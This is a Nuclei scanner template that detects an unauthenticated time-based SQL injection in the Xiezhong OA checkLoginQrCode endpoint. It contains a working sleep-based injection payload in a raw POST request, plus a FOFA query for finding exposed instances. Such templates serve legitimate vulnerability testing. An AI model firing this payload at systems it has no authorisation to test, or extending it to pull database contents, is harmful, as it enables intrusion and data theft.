id: xiezhong-checkLoginQrCode-sqli
info:
  name: 协众 OA checkLoginQrCode - sqli
  author: leadlife
  severity: high
  description: 协众OA checkLoginQrCode 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%8D%8F%E4%BC%97OA/%E5%8D%8F%E4%BC%97OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3checkLoginQrCode%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md
  metadata:
    verified: true
    fofa-query: app="协众软件-协众OA"
    sqlmap: none 2024/12/24
  tags: xiezhong,time,oa,2024,sqli

http:
  - raw:  
      - |
        @timeout: 15s
        POST /index.php?app=main&func=common&action=commonJob&act=checkLoginQrCode HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Priority: u=0, i
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0

        id=(select * from (select sleep(6))z)
      
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'failure','true','msg','1')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and